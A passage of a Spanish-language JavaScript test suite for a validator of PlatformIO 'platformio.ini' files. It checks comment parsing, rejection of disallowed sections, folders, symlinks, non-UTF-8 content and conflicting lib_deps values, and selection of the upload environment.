  rechaza("[env:uno]\nboard = uno\n  [env:otro]\n", "compilacion", "board", "VALOR_NO_ADMITIDO")
})

test("parser: comentarios — línea entera con `;` o `#`, y al final sólo si hay un blanco antes", () => {
  const p = ini.parsearIni("; arriba\n# también\n[env:uno]   ; la placa\n  ; comentario con sangría\nboard = uno   ; tipo de placa\nmonitor_speed = 9600\t# velocidad\nlib_deps =\n    ; arduino-libraries/Servo\n    a/b ; uno\n")
  assert.equal(p.ok, true, JSON.stringify(p.rechazos))
  const s = p.ini.secciones.get("env:uno")
  assert.deepEqual(s.get("board").lineas, ["uno"])
  assert.deepEqual(s.get("monitor_speed").lineas, ["9600"])
  assert.deepEqual(s.get("lib_deps").lineas, ["a/b"])
  // Sin blanco adelante, el `;` NO es comentario: queda en el valor, y el valor no pasa.
  assert.deepEqual(ini.parsearIni("[env:uno]\nboard = uno;x\n").ini.secciones.get("env:uno").get("board").lineas, ["uno;x"])
  rechaza("[env:uno]\nboard = uno;x\n", "compilacion", "board", "VALOR_NO_ADMITIDO")
  // Un acento en un comentario no molesta; fuera de un comentario, sí.
  assert.equal(ini.parsearIni("; versión fijada — así\n" + BASE).ok, true)
})

test("parser: después de una sección rechazada no se le atribuyen sus opciones a la sección anterior", () => {
  // `board` ya está en [env:uno]: si las líneas de [otra] se le atribuyeran, aparecería además
  // una CLAVE_REPETIDA que no existe en el archivo.
  const r = ini.auditarTextoIni(BASE + "[otra]\nboard = x\n", "compilacion")
  assert.equal(r.ok, false)
  assert.deepEqual(r.rechazos.map((x) => x.motivo), ["SECCION_NO_ADMITIDA"])
})

test("parser: un archivo enorme o que no es texto se rechaza sin leerlo entero", () => {
  assert.equal(ini.parsearIni("; " + "x".repeat(300_000)).ok, false)
  assert.equal(ini.parsearIni(undefined).ok, false)
  assert.equal(ini.parsearIni(null).ok, false)
})

// ── En la carpeta ────────────────────────────────────────────────────────────────────────

function conProyecto(armar, probar) {
  const dir = mkdtempSync(join(tmpdir(), "tb-carga-ini-"))
  try {
    armar(dir)
    probar(dir)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
}

test("auditarIni: un proyecto sano pasa; sin ini, con el ini como enlace o como carpeta, no", () => {
  conProyecto((d) => writeFileSync(join(d, "platformio.ini"), BASE), (d) => {
    assert.equal(ini.auditarIni(d, "compilacion").ok, true)
    assert.equal(ini.auditarIni(d, "carga").ok, true)
  })
  conProyecto(() => {}, (d) => assert.equal(ini.auditarIni(d, "compilacion").rechazos[0].motivo, "ARCHIVO_AUSENTE"))
  conProyecto((d) => mkdirSync(join(d, "platformio.ini")), (d) => assert.equal(ini.auditarIni(d, "compilacion").rechazos[0].motivo, "ARCHIVO_NO_REGULAR"))
  conProyecto((d) => {
    writeFileSync(join(d, "otro.ini"), BASE)
    symlinkSync(join(d, "otro.ini"), join(d, "platformio.ini"))
  }, (d) => {
    const r = ini.auditarIni(d, "compilacion")
    assert.equal(r.ok, false)
    assert.equal(r.rechazos[0].motivo, "ARCHIVO_NO_REGULAR")
  })
  conProyecto((d) => writeFileSync(join(d, "platformio.ini"), Buffer.from([0x5b, 0x65, 0x6e, 0x76, 0x3a, 0x78, 0x5d, 0x0a, 0x3b, 0xff, 0xfe, 0x0a])), (d) => {
    // Bytes que no son UTF-8, DENTRO de un comentario: leídos como latin1 pasarían por texto.
    const r = ini.auditarIni(d, "compilacion")
    assert.equal(r.ok, false, "un ini con bytes que no son UTF-8 pasó")
    assert.equal(r.rechazos[0].motivo, "ARCHIVO_ILEGIBLE")
  })
})

test("auditarIni: `boards/` y `monitor/` en el proyecto se rechazan aunque el ini no los nombre (y aunque el ini esté sano)", () => {
  for (const carpeta of ini.CARPETAS_IMPLICITAS_PROHIBIDAS) {
    conProyecto((d) => {
      writeFileSync(join(d, "platformio.ini"), BASE)
      mkdirSync(join(d, carpeta))
    }, (d) => {
      for (const modo of ["compilacion", "carga"]) {
        const r = ini.auditarIni(d, modo)
        assert.equal(r.ok, false, `${carpeta}/ pasó en ${modo}`)
        assert.equal(r.codigo, "INI_NO_ADMITIDO")
        assert.deepEqual(r.rechazos.map((x) => [x.clave, x.motivo]), [[`${carpeta}/`, "CARPETA_NO_ADMITIDA"]])
      }
    })
    // También si es un enlace o un archivo con ese nombre.
    conProyecto((d) => {
      writeFileSync(join(d, "platformio.ini"), BASE)
      symlinkSync(tmpdir(), join(d, carpeta))
    }, (d) => assert.equal(ini.auditarIni(d, "compilacion").ok, false))
  }
  assert.deepEqual([...ini.CARPETAS_IMPLICITAS_PROHIBIDAS], ["boards", "monitor"])
})

test("auditarIni: un lib_deps que coincide con una ruta del proyecto se rechaza (PlatformIO la tomaría como librería local)", () => {
  conProyecto((d) => {
    writeFileSync(join(d, "platformio.ini"), conOpcion("lib_deps = adafruit/DHT sensor library@^1.4.4"))
    mkdirSync(join(d, "adafruit", "DHT sensor library"), { recursive: true })
  }, (d) => {
    const r = ini.auditarIni(d, "compilacion")
    assert.equal(r.ok, false)
    assert.deepEqual(r.rechazos.map((x) => [x.clave, x.motivo]), [["lib_deps", "VALOR_NO_ADMITIDO"]])
  })
  conProyecto((d) => writeFileSync(join(d, "platformio.ini"), conOpcion("lib_deps = adafruit/DHT sensor library@^1.4.4")), (d) => assert.equal(ini.auditarIni(d, "compilacion").ok, true))
})

// ── entornosDeCarga ──────────────────────────────────────────────────────────────────────

test("entornosDeCarga: exactamente un environment, o falla con VARIOS_ENVIRONMENTS y la lista", () => {
  const dos = "[env:uno]\nboard = uno\n[env:esp32dev]\nboard = esp32dev\n"
  assert.deepEqual(ini.entornosDeCarga(BASE), { ok: true, environment: "uno" })
  assert.deepEqual(ini.entornosDeCarga(dos), { ok: false, codigo: "VARIOS_ENVIRONMENTS", disponibles: ["uno", "esp32dev"] })
  assert.deepEqual(ini.entornosDeCarga(dos, "esp32dev"), { ok: true, environment: "esp32dev" })
  assert.deepEqual(ini.entornosDeCarga(dos, "otro"), { ok: false, codigo: "VARIOS_ENVIRONMENTS", disponibles: ["uno", "esp32dev"] })
  assert.deepEqual(ini.entornosDeCarga(`[platformio]\ndefault_envs = esp32dev\n${dos}`), { ok: true, environment: "esp32dev" })
  assert.equal(ini.entornosDeCarga(`[platformio]\ndefault_envs = uno, esp32dev\n${dos}`).ok, false)
  assert.equal(ini.entornosDeCarga(`[platformio]\ndefault_envs = no_existe\n${BASE}`).ok, false, "un default_envs que no existe no cae al único que hay")
  assert.deepEqual(ini.entornosDeCarga("[env]\nboard = uno\n"), { ok: false, codigo: "VARIOS_ENVIRONMENTS", disponibles: [] })
  assert.deepEqual(ini.entornosDeCarga("esto no es un ini"), { ok: false, codigo: "VARIOS_ENVIRONMENTS", disponibles: [] })
})
